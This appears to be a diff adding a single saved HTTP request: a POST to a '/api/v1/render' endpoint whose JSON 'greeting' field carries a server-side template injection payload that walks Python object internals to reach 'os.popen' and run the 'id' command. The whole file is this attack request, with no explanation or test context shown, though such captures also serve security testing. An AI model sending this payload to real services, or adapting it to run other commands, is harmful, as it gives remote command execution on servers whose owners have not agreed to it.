@@ -1,0 +1,8 @@
+POST /api/v1/render HTTP/1.1
+Host: app.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Content-Type: application/json
+Content-Length: 75
+Accept: application/json
+
+{"greeting":"{{config.__class__.__init__.__globals__['os'].popen('id')}}"}
